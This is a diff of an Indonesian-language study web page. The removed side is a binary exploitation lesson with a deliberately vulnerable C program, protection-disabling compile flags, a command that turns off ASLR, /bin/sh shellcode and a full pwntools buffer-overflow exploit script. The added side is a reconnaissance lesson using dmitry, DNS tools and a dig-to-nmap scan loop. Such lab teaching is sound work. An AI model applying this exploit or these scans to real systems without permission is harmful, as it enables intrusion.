@@ -6,7 +6,7 @@
     <meta charset="UTF-8">
 
     <!-- ----------------------------------------------- DIGANTI JUDUL ----------------------------------------------- -->
-    <title>binex-pwnshell</title>
+    <title>Information Gathering</title>
     <!-- ----------------------------------------------# DIGANTI JUDUL #---------------------------------------------- -->
 
 
@@ -15,11 +15,10 @@
 
 
 
-    <!-- <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-    <meta name="description"
-        content="Nightmare: an intro to binary exploitation / reverse engineering course based around CTF challenges.">
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="description" content="Wetofu : belajar suka-suka aee">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="theme-color" content="#ffffff" /> -->
+    <meta name="theme-color" content="#ffffff" />
 
 
     <link rel="icon" href="../favicon.svg">
@@ -102,7 +101,7 @@
         html.classList.add("sidebar-" + sidebar);
     </script>
 
-  <!-- ---------------------------------------- NAV ---------------------------------------- -->
+    <!-- ---------------------------------------- NAV ---------------------------------------- -->
 <nav id="sidebar" class="sidebar" aria-label="Table of contents">
     <div class="sidebar-scrollbox">
         <ol class="chapter">
@@ -416,7 +415,7 @@
 
                 </div>
                 <!-- ----------------------------------------------- DIGANTI MENU TITLE ----------------------------------------------- -->
-                <h1 class="menu-title">Binex-pwnshell</h1>
+                <h1 class="menu-title">Information Gathering</h1>
                 <!-- ----------------------------------------------# DIGANTI MENU TITLE #---------------------------------------------- -->
 
                 <div class="right-buttons">
@@ -457,127 +456,185 @@
             <div id="content" class="content">
                 <main>
                     <!-- ----------------------------------------------- DIGANTI MENU ----------------------------------------------- -->
-                    <h1><a class="header" href="#intro" id="intro">Binary Exploitation : pwn & shellcode</a></h1>
-                    <p>source code : <br> <pre><code>#include<stdio.h>
-#include<unistd.h>
-                        
-int main(){
-    char buffer[64];
-    printf("buffer ada di %p\n", &buffer);
-    fflush(stdout);
-                        
-    read(0, &buffer, 128);
-                        
-    return 0;
-}</code></pre></p>
-<p>Makefile : (asumsi nama file shellcode.c)<br>*sementara masih yg 32bit :) 
-<pre><code>gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 -z execstack shellcode.c -o shellcode</code></pre>
-</p>
-                    <p>link shellcode <a href="http://shell-storm.org" target="_blank">http://shell-storm.org</a><br>
-                    untuk dapat mengakses ke <code>/bin/bash</code> menggunakan kode <a href="http://shell-storm.org/shellcode/files/shellcode-752.php" target="_blank">assembly</a>
-                    <br><br>
-                    assembly untuk menjalankan perintah /bin/sh
-                    </p>
+                    <br><br>    
+                    <ul>
+                        <li>
+                            <a class="header" href="#dmitry">Dmitry</a>
+                        </li>
+                        <li>
+                            <a class="header" href="#dnsen">DNS Enumeration</a>
+                        </li>
+                    </ul><br>
+                    <hr>
+                    <h4><a class="header" id="dmitry" style="text-decoration: none;">Dmitry</a></h4>
+<pre>usage :
+dmitry [-winsepfb] [-t 0-9] [-o %host.txt] host
+-o      save output to %host.txt or specified file
+-i      perform a whois lookup on the IP address of a host
+-w      perform a whois lookup on the IP domain of a host
+-n      retrieve netcraft.com information on a host
+-s      perform a search for possible subdomains
+-e      perform a search for possible email address
+-p      perform a TCP port scan on a host
+*-f     perform a TCP port scan on a host showing output reporting filtered ports
+*-b     read in the banner received from the scanned port
+*-t 0-9 set the TTL in seconds when scanning a TCP port(default 2)
+*Requires the -p flagged to be passed</pre>
+<pre><code>dmitry -i 192.168.43.1</code></pre>
+<pre><code>dmitry -i 192.168.43.1 -o tampung.txt</code></pre>
+<pre><code>dmitry -wnpe -o hsploit.com results</code></pre>
+<pre><code>dmitry -w zonetransfer.me</code></pre>
+<pre><code>dmitry -p 192.168.43.1</code></pre>
+response : <br>
+<img src="../gambar/gamb4.png" alt="">
+<br><br>
+<h4><a class="header" id="dnsen" style="text-decoration: none;">DNS Enumeration</a></h4>
+<ul>
+    <li>Host</li>
+    <pre>Usage: host [-aCdilrTvVw] [-c class] [-N ndots] [-t type] [-W time]
+    [-R number] [-m flag] hostname [server]
+-a is equivalent to -v -t ANY
+-A is like -a but omits RRSIG, NSEC, NSEC3
+-c specifies query class for non-IN data
+-C compares SOA records on authoritative nameservers
+-d is equivalent to -v
+-l lists all hosts in a domain, using AXFR
+-m set memory debugging flag (trace|record|usage)
+-N changes the number of dots allowed before root lookup is done
+-r disables recursive processing
+-R specifies number of retries for UDP packets
+-s a SERVFAIL response should stop query
+-t specifies the query type
+-T enables TCP/IP mode
+-U enables UDP mode
+-v enables verbose output
+-V print version number and exit
+-w specifies to wait forever for a reply
+-W specifies how long to wait for a reply
+-4 use IPv4 query transport only
+-6 use IPv6 query transport only</pre>
+<pre><code>host 192.168.43.1</code></pre>
+<pre><code>host -t ns 192.168.43.1</code></pre>
+<pre><code>host -t mx 192.168.43.1</code></pre>
+<li>Nslookup</li>
+<pre><code>nslookup 192.168.43.1</code></pre>
+<pre><code>nslookup
+set type=ns
+192.168.43.1
 
-<pre><code>xor ecx, ecx
-mul ecx
-push ecx
-push 0x68732f2f
-push 0x6e69622f
-mov ebx, esp
-mov al, 11
-int 0x80</code></pre>
-program python untuk mendapatkan line assembly : <pre><code>from pwn import *
-
-kode = '''
-xor ecx, ecx
-mul ecx
-push ecx
-push 0x68732f2f
-push 0x6e69622f
-mov ebx, esp
-mov al, 11
-int 0x80
-'''
-
-bentuk_line = asm(kode)
-dikembalikan_bentuk_kode = disasm(bentuk_line)
-
-print bentuk_line
+set type=mx
+192.168.43.1
 </code></pre>
-dalam bentuk line : (yang akan digunakan sebagai payload)
-<pre><code>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code></pre>
+<li>dig</li>
+<pre>Usage:  dig [@global-server] [domain] [q-type] [q-class] {q-opt}
+    {global-d-opt} host [@local-server] {local-d-opt}
+    [ host [@local-server] {local-d-opt} [...]]
+Where:  domain	  is in the Domain Name System
+q-class  is one of (in,hs,ch,...) [default: in]
+q-type   is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a]
+         (Use ixfr=version for type ixfr)
+q-opt    is one of:
+         -4                  (use IPv4 query transport only)
+         -6                  (use IPv6 query transport only)
+         -b address[#port]   (bind to source address/port)
+         -c class            (specify query class)
+         -f filename         (batch mode)
+         -k keyfile          (specify tsig key file)
+         -m                  (enable memory usage debugging)
+         -p port             (specify port number)
+         -q name             (specify query name)
+         -r                  (do not read ~/.digrc)
+         -t type             (specify query type)
+         -u                  (display times in usec instead of msec)
+         -x dot-notation     (shortcut for reverse lookups)
+         -y [hmac:]name:key  (specify named base64 tsig key)
+d-opt    is of the form +keyword[=value], where keyword is:
+         +[no]aaflag         (Set AA flag in query (+[no]aaflag))
+         +[no]aaonly         (Set AA flag in query (+[no]aaflag))
+         +[no]additional     (Control display of additional section)
+         +[no]adflag         (Set AD flag in query (default on))
+         +[no]all            (Set or clear all display flags)
+         +[no]answer         (Control display of answer section)
+         +[no]authority      (Control display of authority section)
+         +[no]badcookie      (Retry BADCOOKIE responses)
+         +[no]besteffort     (Try to parse even illegal messages)
+         +bufsize=###        (Set EDNS0 Max UDP packet size)
+         +[no]cdflag         (Set checking disabled flag in query)
+         +[no]class          (Control display of class in records)
+         +[no]cmd            (Control display of command line -
+                              global option)
+         +[no]comments       (Control display of packet header
+                              and section name comments)
+         +[no]cookie         (Add a COOKIE option to the request)
+         +[no]crypto         (Control display of cryptographic
+                              fields in records)
+         +[no]defname        (Use search list (+[no]search))
+         +[no]dnssec         (Request DNSSEC records)
+         +domain=###         (Set default domainname)
+         +[no]dscp[=###]     (Set the DSCP value to ### [0..63])
+         +[no]edns[=###]     (Set EDNS version) [0]
+         +ednsflags=###      (Set EDNS flag bits)
+         +[no]ednsnegotiation (Set EDNS version negotiation)
+         +ednsopt=###[:value] (Send specified EDNS option)
+         +noednsopt          (Clear list of +ednsopt options)
+         +[no]expandaaaa     (Expand AAAA records)
+         +[no]expire         (Request time to expire)
+         +[no]fail           (Don't try next server on SERVFAIL)
+         +[no]header-only    (Send query without a question section)
+         +[no]identify       (ID responders in short answers)
+         +[no]idnin          (Parse IDN names [default=on on tty])
+         +[no]idnout         (Convert IDN response [default=on on tty])
+         +[no]ignore         (Don't revert to TCP for TC responses.)
+         +[no]keepalive      (Request EDNS TCP keepalive)
+         +[no]keepopen       (Keep the TCP socket open between queries)
+         +[no]mapped         (Allow mapped IPv4 over IPv6)
+         +[no]multiline      (Print records in an expanded format)
+         +ndots=###          (Set search NDOTS value)
+         +[no]nsid           (Request Name Server ID)
+         +[no]nssearch       (Search all authoritative nameservers)
+         +[no]onesoa         (AXFR prints only one soa record)
+         +[no]opcode=###     (Set the opcode of the request)
+         +padding=###        (Set padding block size [0])
+         +[no]qr             (Print question before sending)
+         +[no]question       (Control display of question section)
+         +[no]raflag         (Set RA flag in query (+[no]raflag))
+         +[no]rdflag         (Recursive mode (+[no]recurse))
+         +[no]recurse        (Recursive mode (+[no]rdflag))
+         +retry=###          (Set number of UDP retries) [2]
+         +[no]rrcomments     (Control display of per-record comments)
+         +[no]search         (Set whether to use searchlist)
+         +[no]short          (Display nothing except short
+                              form of answers - global option)
+         +[no]showsearch     (Search with intermediate results)
+         +[no]split=##       (Split hex/base64 fields into chunks)
+         +[no]stats          (Control display of statistics)
+         +subnet=addr        (Set edns-client-subnet option)
+         +[no]tcflag         (Set TC flag in query (+[no]tcflag))
+         +[no]tcp            (TCP mode (+[no]vc))
+         +timeout=###        (Set query timeout) [5]
+         +[no]trace          (Trace delegation down from root [+dnssec])
+         +tries=###          (Set number of UDP attempts) [3]
+         +[no]ttlid          (Control display of ttls in records)
+         +[no]ttlunits       (Display TTLs in human-readable units)
+         +[no]unexpected     (Print replies from unexpected sources
+                              default=off)
+         +[no]unknownformat  (Print RDATA in RFC 3597 "unknown" format)
+         +[no]vc             (TCP mode (+[no]tcp))
+         +[no]yaml           (Present the results as YAML)
+         +[no]zflag          (Set Z flag in query)
+global d-opts and servers (before host name) affect all queries.
+local d-opts and servers (after host name) affect only that lookup.
+-h                           (print help and exit)
+-v                           (print version and exit)</pre>
+<pre><code>dig 192.168.43.1</code></pre>
+<pre><code>dig 192.168.43.1 -t mx</code></pre>
+<pre><code>dig 192.168.43.1 -t ns</code></pre>
+<pre><code>dig 192.168.43.1 -t AAAA</code></pre>
+<pre><code>dig 192.168.43.1 -t mx +short</code></pre>
+<pre><code>dig 192.168.43.1 CNAME +short</code></pre>
+<pre><code>for ip in 'dig 192.168.43.1 +short';do nmap $ip; done</code></pre>
+</ul>
 
-                    <p><br> syarat & tahap : <br> 
-                        <ul>
-                            <li>dalam bentuk stack executable / disable execstack<br><code>maka dalam makefile ditambah '-z execstack'</code> </li>
-                            <li>ada 2 seri : aslr/randomize memory off dan aslr/randomize memory on (untuk belajar, di off-kan dulu) <br>
-                                <pre><code>echo "0" > /proc/sys/kernel/randomize_va_space</code><br>"0" untuk off, "1" untuk on</pre>
-                            </li>
-                            dicek <code>NX</code> harus disable :<br>  
-                            <img src="../gambar/gamb2.png" alt=""><br><br>
-                            <li>mengetahui alamat buffer & offset, <br> run dalam gdb, ide : memenuhi input hingga <code> SIGSEGV / segmentation vault</code></li><br>
-                            <img src="../gambar/gamb3.png" alt="">
-                            <br>didapat <code>offset = 68</code>
-                        </ul>
-                    </p>
-                    <br>
-                    <img src="../gambar/gamb1.png" alt="gdb">
-                    <pre><code><span class="hljs-number">0x08049204</span> &lt;+<span class="hljs-number">46</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">eax</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x40</span>]
-<span class="hljs-number">0x08049207</span> &lt;+<span class="hljs-number">49</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">eax</span>
-<span class="hljs-number">0x08049208</span> &lt;+<span class="hljs-number">50</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span>
-<span class="hljs-number">0x0804920a</span> &lt;+<span class="hljs-number">52</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x8049080</span> &lt;read@plt&gt;
-</code></pre>
-    <p>proses <code>read</code> pada <code>[ebp-0x40]</code> = 68 desimal</p>
-
-    <p>ide : <br>
-    <code>shellcode + 'A'*(offset - len(shellcode)) + memori_buff</code>
-    </p>
-
-    <p><br><br>Maka didapat code python : <br>
-        <pre><code class="lang-html">from pwn import *
-import struct
-
-# opsional --> dapat diganti
-context(arch='i386', os='linux')
-
-# jalankan program --> dapat diganti
-p = process('./shellcode')
-
-# interaksi dengan output program --> dapat diganti
-p.recvuntil("di ")
-
-# alamat buffer --> dapat diganti (jika perlu)
-buff = int(p.recvline(),16)         
-
-# asumsi telah mengetahui offset (berdasarkan percobaan diatas) --> dapat diganti
-offset = 68
-
-# asumsi menggunakan mesin &lt;I / litle endian 32 bit --> dapat diganti (jika perlu)
-memori_buff = struct.pack("&lt;I", buff) 
-
-# paten / didapat dr http://shell-storm.org/shellcode/files/shellcode-752.php
-shellcode = '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'
-
-# membuat payload --> dapat diganti
-payload = shellcode + 'A'*(offset - len(shellcode)) + memori_buff
-
-# memberi input dengan...
-p.sendline(payload+'<span class="hljs-symbol">\n</span>')
-
-# agar shell dapat berjalan
-p.interactive()
-            </code></pre>
-            sudah masuk ke dalam shell
-            <br><br>
-            <p>Masalah : <br>
-            <ol>
-                <li>bagaimana kalau tidak diketahui alamat buffer ?</li>
-            </ol>
-            </p>
-            <br><br><br><br><br>
-            
-    </p>
                     <!-- ----------------------------------------------# DIGANTI MENU #---------------------------------------------- -->
                 </main>
 
@@ -586,15 +643,15 @@ p.interactive()
                     <!-- ----------------------------------------------- DIGANTI PREV NEXT ----------------------------------------------- -->
 
                     <!-- sebelum -->
-                    <a rel="prev" href="binex.html" class="mobile-nav-chapters previous" title="Previous chapter"
+                    <a rel="prev" href="footprinting.html" class="mobile-nav-chapters previous" title="Previous chapter"
                         aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
 
 
                     <!-- sesudah -->
-                    <a rel="next" href="assembly.html" class="mobile-nav-chapters next"
-                        title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next" href="deepweeb.html" class="mobile-nav-chapters next" title="Next chapter"
+                        aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
                     <!-- ----------------------------------------------# DIGANTI PREV NEXT #---------------------------------------------- -->
@@ -607,13 +664,13 @@ p.interactive()
         <nav class="nav-wide-wrapper" aria-label="Page navigation">
             <!-- ----------------------------------------------- DIGANTI PREV NEXT 2 ----------------------------------------------- -->
             <!-- sebelum -->
-            <a rel="prev" href="binex.html" class="nav-chapters previous" title="Previous chapter"
+            <a rel="prev" href="footprinting.html" class="nav-chapters previous" title="Previous chapter"
                 aria-label="Previous chapter" aria-keyshortcuts="Left">
                 <i class="fa fa-angle-left"></i>
             </a>
             <!-- sesudah -->
-            <a rel="next" href="assembly.html" class="nav-chapters next" title="Next chapter"
-                aria-label="Next chapter" aria-keyshortcuts="Right">
+            <a rel="next" href="deepweeb.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter"
+                aria-keyshortcuts="Right">
                 <i class="fa fa-angle-right"></i>
             </a>
             <!-- ----------------------------------------------# DIGANTI PREV NEXT 2 #---------------------------------------------- -->
